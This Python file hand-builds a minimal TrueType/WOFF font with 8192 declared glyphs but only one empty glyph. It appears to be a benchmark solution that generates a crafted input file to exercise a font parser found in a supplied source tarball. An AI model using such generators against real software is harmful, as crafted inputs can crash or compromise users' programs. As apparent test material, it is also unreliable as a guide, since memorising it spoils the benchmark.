import struct
import zlib
import tarfile
from typing import Dict, Tuple, List


def _u16(v: int) -> bytes:
    return struct.pack(">H", v & 0xFFFF)


def _i16(v: int) -> bytes:
    return struct.pack(">h", int(v))


def _u32(v: int) -> bytes:
    return struct.pack(">I", v & 0xFFFFFFFF)


def _tag(t: str) -> bytes:
    b = t.encode("ascii", "strict")
    if len(b) != 4:
        raise ValueError("Tag must be 4 bytes")
    return b


def _pad4(b: bytes) -> bytes:
    r = (-len(b)) & 3
    if r:
        return b + (b"\x00" * r)
    return b


def _checksum(data: bytes) -> int:
    d = _pad4(data)
    s = 0
    for i in range(0, len(d), 4):
        s = (s + struct.unpack(">I", d[i:i + 4])[0]) & 0xFFFFFFFF
    return s


def _sfnt_params(num_tables: int) -> Tuple[int, int, int]:
    max_power2 = 1
    entry_selector = 0
    while (max_power2 << 1) <= num_tables:
        max_power2 <<= 1
        entry_selector += 1
    search_range = max_power2 * 16
    range_shift = num_tables * 16 - search_range
    return search_range, entry_selector, range_shift


def _build_sfnt(tables: Dict[str, bytes]) -> Tuple[bytes, Dict[str, Tuple[int, int, int]]]:
    tags = sorted(tables.keys())
    num_tables = len(tags)
    search_range, entry_selector, range_shift = _sfnt_params(num_tables)

    offset_table = _u32(0x00010000) + _u16(num_tables) + _u16(search_range) + _u16(entry_selector) + _u16(range_shift)

    dir_entries = []
    table_data_parts = []
    current_offset = 12 + 16 * num_tables
    current_offset = (current_offset + 3) & ~3

    records: Dict[str, Tuple[int, int, int]] = {}
    for t in tags:
        data = tables[t]
        length = len(data)
        csum = _checksum(data)
        dir_entries.append(_tag(t) + _u32(csum) + _u32(current_offset) + _u32(length))
        table_data_parts.append(_pad4(data))
        records[t] = (csum, current_offset, length)
        current_offset += len(_pad4(data))

    sfnt = offset_table + b"".join(dir_entries) + b"".join(table_data_parts)
    return sfnt, records


def _build_head(index_to_loc_format: int) -> bytes:
    # 'head' table (54 bytes)
    # version, fontRevision, checkSumAdjustment, magicNumber, flags, unitsPerEm,
    # created, modified, xMin, yMin, xMax, yMax, macStyle, lowestRecPPEM,
    # fontDirectionHint, indexToLocFormat, glyphDataFormat
    return (
        _u32(0x00010000) +            # version
        _u32(0x00010000) +            # fontRevision
        _u32(0) +                     # checkSumAdjustment (patched later)
        _u32(0x5F0F3CF5) +            # magicNumber
        _u16(0x0003) +                # flags
        _u16(1024) +                  # unitsPerEm
        (_u32(0) + _u32(0)) +         # created
        (_u32(0) + _u32(0)) +         # modified
        _i16(0) + _i16(0) + _i16(0) + _i16(0) +  # bbox
        _u16(0) +                     # macStyle
        _u16(8) +                     # lowestRecPPEM
        _i16(2) +                     # fontDirectionHint
        _i16(index_to_loc_format) +   # indexToLocFormat
        _i16(0)                       # glyphDataFormat
    )


def _build_hhea(num_hmetrics: int, advance_width_max: int = 512) -> bytes:
    # 'hhea' table (36 bytes)
    ascent = 800
    descent = -200
    line_gap = 0
    return (
        _u32(0x00010000) +        # version
        _i16(ascent) +            # ascent
        _i16(descent) +           # descent
        _i16(line_gap) +          # lineGap
        _u16(advance_width_max) + # advanceWidthMax
        _i16(0) +                 # minLeftSideBearing
        _i16(0) +                 # minRightSideBearing
        _i16(0) +                 # xMaxExtent
        _i16(1) +                 # caretSlopeRise
        _i16(0) +                 # caretSlopeRun
        _i16(0) +                 # caretOffset
        _i16(0) + _i16(0) + _i16(0) + _i16(0) +  # reserved
        _i16(0) +                 # metricDataFormat
        _u16(num_hmetrics)        # numberOfHMetrics
    )


def _build_maxp(num_glyphs: int) -> bytes:
    # 'maxp' version 1.0 (32 bytes): version, numGlyphs, 13 uint16 fields
    max_zones = 2
    fields = [
        0,  # maxPoints
        0,  # maxContours
        0,  # maxCompositePoints
        0,  # maxCompositeContours
        max_zones,  # maxZones
        0,  # maxTwilightPoints
        0,  # maxStorage
        0,  # maxFunctionDefs
        0,  # maxInstructionDefs
        0,  # maxStackElements
        0,  # maxSizeOfInstructions
        0,  # maxComponentElements
        0,  # maxComponentDepth
    ]
    return _u32(0x00010000) + _u16(num_glyphs) + b"".join(_u16(x) for x in fields)


def _build_hmtx(num_glyphs: int, advance_width: int = 512, lsb: int = 0) -> bytes:
    rec = _u16(advance_width) + _i16(lsb)
    return rec * num_glyphs


def _build_loca_short_one_glyph_data(num_glyphs: int, glyph0_length: int) -> bytes:
    # short format: offsets/2
    # glyph0 at offset 0..glyph0_length, remaining glyphs length 0
    if glyph0_length & 1:
        raise ValueError("glyph0_length must be even for short loca")
    v0 = 0
    v_rest = glyph0_length // 2
    # num_glyphs + 1 entries: [0] + [v_rest]*num_glyphs
    return _u16(v0) + (_u16(v_rest) * num_glyphs)


def _build_glyf_one_empty_glyph() -> bytes:
    # Empty simple glyph:
    # numberOfContours=0, xMin=yMin=xMax=yMax=0, instructionLength=0
    return _i16(0) + _i16(0) + _i16(0) + _i16(0) + _i16(0) + _u16(0)


def _build_cmap_format4_single_char(char_code: int, glyph_id: int) -> bytes:
    # cmap header: version=0, numTables=1, encodingRecord (platform=3, encoding=1, offset=12)
    # format 4 subtable with 2 segments: [char_code..char_code] and sentinel [0xFFFF..0xFFFF]
    seg_count = 2
    seg_count_x2 = seg_count * 2
    search_range = 2 * (1 << (seg_count.bit_length() - 1))
    entry_selector = (seg_count.bit_length() - 1)
    range_shift = seg_count_x2 - search_range

    # segment 1 maps char_code -> glyph_id, idRangeOffset=0
    id_delta1 = (glyph_id - char_code) & 0xFFFF
    # segment 2 sentinel
    id_delta2 = 1

    end_codes = [_u16(char_code), _u16(0xFFFF)]
    start_codes = [_u16(char_code), _u16(0xFFFF)]
    id_deltas = [_u16(id_delta1), _u16(id_delta2)]
    id_range_offsets = [_u16(0), _u16(0)]

    subtable = (
        _u16(4) +                 # format
        _u16(32) +                # length
        _u16(0) +                 # language
        _u16(seg_count_x2) +
        _u16(search_range) +
        _u16(entry_selector) +
        _u16(range_shift) +
        b"".join(end_codes) +
        _u16(0) +                 # reservedPad
        b"".join(start_codes) +
        b"".join(id_deltas) +
        b"".join(id_range_offsets)
    )

    cmap = (
        _u16(0) +                 # version
        _u16(1) +                 # numTables
        _u16(3) + _u16(1) + _u32(12) +  # encodingRecord
        subtable
    )
    return cmap


def _build_name_minimal() -> bytes:
    # name table version 0 with one record: Family name "A"
    # platform=3, encoding=1, language=0x0409, nameID=1
    s = b"\x00A"  # UTF-16BE "A"
    count = 1
    string_offset = 6 + 12 * count
    rec = _u16(3) + _u16(1) + _u16(0x0409) + _u16(1) + _u16(len(s)) + _u16(0)
    return _u16(0) + _u16(count) + _u16(string_offset) + rec + s


def _build_post_v3() -> bytes:
    return (
        _u32(0x00030000) +    # version 3.0
        _u32(0) +             # italicAngle
        _i16(0) +             # underlinePosition
        _i16(0) +             # underlineThickness
        _u32(0) +             # isFixedPitch
        _u32(0) + _u32(0) + _u32(0) + _u32(0)  # mem usage
    )


def _build_os2_v0() -> bytes:
    # OS/2 version 0 (78 bytes)
    version = 0
    x_avg_char_width = 512
    us_weight_class = 400
    us_width_class = 5
    fs_type = 0
    y_subscript_x_size = 650
    y_subscript_y_size = 699
    y_subscript_x_offset = 0
    y_subscript_y_offset = 140
    y_superscript_x_size = 650
    y_superscript_y_size = 699
    y_superscript_x_offset = 0
    y_superscript_y_offset = 479
    y_strikeout_size = 49
    y_strikeout_position = 258
    s_family_class = 0
    panose = b"\x00" * 10
    ul_unicode_range = (_u32(0), _u32(0), _u32(0), _u32(0))
    ach_vend_id = b"NONE"
    fs_selection = 0
    us_first_char_index = 0x0041
    us_last_char_index = 0x0041
    s_typo_ascender = 800
    s_typo_descender = -200
    s_typo_line_gap = 0
    us_win_ascent = 800
    us_win_descent = 200

    return (
        _u16(version) +
        _i16(x_avg_char_width) +
        _u16(us_weight_class) +
        _u16(us_width_class) +
        _u16(fs_type) +
        _i16(y_subscript_x_size) +
        _i16(y_subscript_y_size) +
        _i16(y_subscript_x_offset) +
        _i16(y_subscript_y_offset) +
        _i16(y_superscript_x_size) +
        _i16(y_superscript_y_size) +
        _i16(y_superscript_x_offset) +
        _i16(y_superscript_y_offset) +
        _i16(y_strikeout_size) +
        _i16(y_strikeout_position) +
        _i16(s_family_class) +
        panose +
        b"".join(ul_unicode_range) +
        ach_vend_id +
        _u16(fs_selection) +
        _u16(us_first_char_index) +
        _u16(us_last_char_index) +
        _i16(s_typo_ascender) +
        _i16(s_typo_descender) +
        _i16(s_typo_line_gap) +
        _u16(us_win_ascent) +
        _u16(us_win_descent)
    )


def _build_woff(tables: Dict[str, bytes], flavor: int = 0x00010000) -> bytes:
    # Compute checkSumAdjustment in head by constructing SFNT first
    sfnt0, _ = _build_sfnt(tables)
    total_sum = _checksum(sfnt0)
    adjustment = (0xB1B0AFBA - total_sum) & 0xFFFFFFFF

    head = bytearray(tables["head"])
    head[8:12] = _u32(adjustment)
    tables2 = dict(tables)
    tables2["head"] = bytes(head)

    sfnt, records = _build_sfnt(tables2)
    total_sfnt_size = len(sfnt)

    tags = sorted(tables2.keys())
    num_tables = len(tags)

    header_len = 44
    dir_len = num_tables * 20
    data_offset = header_len + dir_len
    data_offset = (data_offset + 3) & ~3

    dir_entries = []
    data_blobs: List[bytes] = []
    curr = data_offset

    for t in tags:
        data = tables2[t]
        orig_len = len(data)
        comp = zlib.compress(data, 9)
        if len(comp) >= orig_len:
            comp_data = data
        else:
            comp_data = comp

        comp_len = len(comp_data)
        csum, _, _ = records[t]
        dir_entries.append(_tag(t) + _u32(curr) + _u32(comp_len) + _u32(orig_len) + _u32(csum))
        data_blobs.append(_pad4(comp_data))
        curr += len(_pad4(comp_data))

    woff_len = curr
    # WOFF header
    woff_header = (
        _u32(0x774F4646) +     # signature 'wOFF'
        _u32(flavor) +
        _u32(woff_len) +
        _u16(num_tables) +
        _u16(0) +              # reserved
        _u32(total_sfnt_size) +
        _u16(1) + _u16(0) +    # major/minor version
        _u32(0) + _u32(0) + _u32(0) +  # metaOffset, metaLength, metaOrigLength
        _u32(0) + _u32(0)      # privOffset, privLength
    )

    out = bytearray()
    out += woff_header
    out += b"".join(dir_entries)
    if len(out) < data_offset:
        out += b"\x00" * (data_offset - len(out))
    out += b"".join(data_blobs)

    if len(out) != woff_len:
        out = out[:woff_len] if len(out) > woff_len else out + (b"\x00" * (woff_len - len(out)))
    return bytes(out)


def _supports_woff_in_source(src_path: str) -> bool:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            checked = 0
            for m in tf:
                if checked >= 200:
                    break
                if not m.isfile():
                    continue
                name = (m.name or "").lower()
                if "woff" in name:
                    return True
                if not (name.endswith(".cc") or name.endswith(".c") or name.endswith(".cpp") or name.endswith(".cxx") or
                        name.endswith(".h") or name.endswith(".hpp") or name.endswith(".hh")):
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read(4096)
                if b"wOFF" in data or b"WOFF" in data or b"DecodeWOFF" in data or b"WOFFHeader" in data:
                    return True
                checked += 1
    except Exception:
        return True
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        num_glyphs = 8192
        index_to_loc_format = 0  # short
        glyph0 = _build_glyf_one_empty_glyph()
        glyf = glyph0
        loca = _build_loca_short_one_glyph_data(num_glyphs, len(glyph0))

        tables: Dict[str, bytes] = {
            "head": _build_head(index_to_loc_format),
            "hhea": _build_hhea(num_glyphs, advance_width_max=512),
            "maxp": _build_maxp(num_glyphs),
            "hmtx": _build_hmtx(num_glyphs, advance_width=512, lsb=0),
            "loca": loca,
            "glyf": glyf,
            "cmap": _build_cmap_format4_single_char(0x0041, 0),  # map 'A' to glyph 0
            "name": _build_name_minimal(),
            "post": _build_post_v3(),
            "OS/2": _build_os2_v0(),
        }

        if _supports_woff_in_source(src_path):
            return _build_woff(tables, flavor=0x00010000)

        # Fallback: return SFNT directly (still includes correct checkSumAdjustment)
        sfnt0, _ = _build_sfnt(tables)
        adjustment = (0xB1B0AFBA - _checksum(sfnt0)) & 0xFFFFFFFF
        head = bytearray(tables["head"])
        head[8:12] = _u32(adjustment)
        tables["head"] = bytes(head)
        sfnt, _ = _build_sfnt(tables)
        return sfnt